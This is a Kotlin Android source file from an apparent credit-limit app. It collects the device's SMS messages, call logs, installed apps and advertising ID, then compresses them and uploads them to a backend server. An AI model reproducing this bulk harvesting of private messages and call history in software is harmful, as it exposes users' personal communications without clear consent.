package com.demo.creditlimit.network.manager

import android.content.Context
import android.util.Log
import com.demo.creditlimit.network.api.ApiService
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.GZIPOutputStream

private const val TAG = "RuntimeManager"

class RuntimeManager(
    private val context: Context,
    private val apiService: ApiService,
    private val gaidManager: GaidManager
) {

    private val isUploading = AtomicBoolean(false)
    private val gson = Gson()

    /**
     * Collects device info and uploads to backend.
     * Re-entrant calls are silently ignored.
     * Returns true if upload was attempted (not blocked by re-entrancy).
     */
    suspend fun uploadAsync(): Boolean = withContext(Dispatchers.IO) {
        if (!isUploading.compareAndSet(false, true)) {
            Log.d(TAG, "upload skipped — already in progress")
            return@withContext false
        }
        try {
            Log.d(TAG, "▶ collecting device info...")
            val t0 = System.currentTimeMillis()

            val gaid = gaidManager.getGaid() ?: ""
            val req = DeviceInfoCollector.collect(context, gaid)

            val collectMs = System.currentTimeMillis() - t0
            val details = req.deviceDetails
            val smsCount = runCatching { gson.fromJson(details?.sms, Array<Any>::class.java)?.size ?: 0 }.getOrElse { 0 }
            val callCount = runCatching { gson.fromJson(details?.callLog, Array<Any>::class.java)?.size ?: 0 }.getOrElse { 0 }
            val appCount = runCatching { gson.fromJson(details?.application, Array<Any>::class.java)?.size ?: 0 }.getOrElse { 0 }
            Log.d(TAG, "✔ collected in ${collectMs}ms | apps=$appCount sms=$smsCount callLog=$callCount gaid=$gaid")

            val json = gson.toJson(req)
            val gzipped = gzip(json.toByteArray(Charsets.UTF_8))
            Log.d(TAG, "▶ uploading — json=${json.length}B gzip=${gzipped.size}B")

            val body = gzipped.toRequestBody("application/octet-stream".toMediaType())
            val result = runCatching { apiService.uploadRuntime(body) }

            if (result.isSuccess) {
                val resp = result.getOrNull()
                Log.d(TAG, "✔ upload success — http ${resp?.code()}")
            } else {
                Log.w(TAG, "✘ upload failed — ${result.exceptionOrNull()?.message}")
            }
            true
        } finally {
            isUploading.set(false)
        }
    }

    private fun gzip(data: ByteArray): ByteArray {
        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { it.write(data) }
        return bos.toByteArray()
    }
}
